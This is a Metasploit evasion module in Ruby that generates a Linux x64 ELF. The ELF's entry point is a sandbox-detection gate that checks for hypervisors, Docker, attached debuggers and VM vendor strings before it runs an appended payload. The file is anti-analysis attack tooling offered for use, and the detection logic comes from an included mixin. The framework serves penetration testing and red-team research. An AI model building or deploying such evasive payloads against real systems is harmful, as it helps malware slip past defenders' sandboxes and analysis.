##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Evasion

  include Msf::Payload::Linux::X64::SandboxEvasion

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux x64 Sandbox Environment Gate',
        'Description' => %q{
          Generates a Linux x64 ELF whose entry point is a pre-execution
          environment gate. Checks /proc/cpuinfo (hypervisor flag),
          /proc/1/cgroup (docker), /proc/self/status (TracerPid), and
          /sys/class/dmi/id/sys_vendor (VM vendor string).
        },
        'Author' => ['Massimo Bertocchi'],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => [ARCH_X64],
        'Targets' => [['Linux x64', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options(
      [
        OptString.new('FILENAME', [true, 'Output filename', 'env_gate.elf'])
      ]
    )
  end

  def run
    raw_payload = payload.encoded
    if raw_payload.blank?
      fail_with(Failure::BadConfig, 'Failed to generate payload')
    end

    gate_stub = sandbox_evasion
    if gate_stub.blank?
      fail_with(Failure::BadConfig, 'Gate stub assembly failed')
    end

    combined  = gate_stub + raw_payload
    final_elf = Msf::Util::EXE.to_linux_x64_elf(framework, combined)

    File.binwrite(datastore['FILENAME'], final_elf)
    File.chmod(0o755, datastore['FILENAME'])
  end
end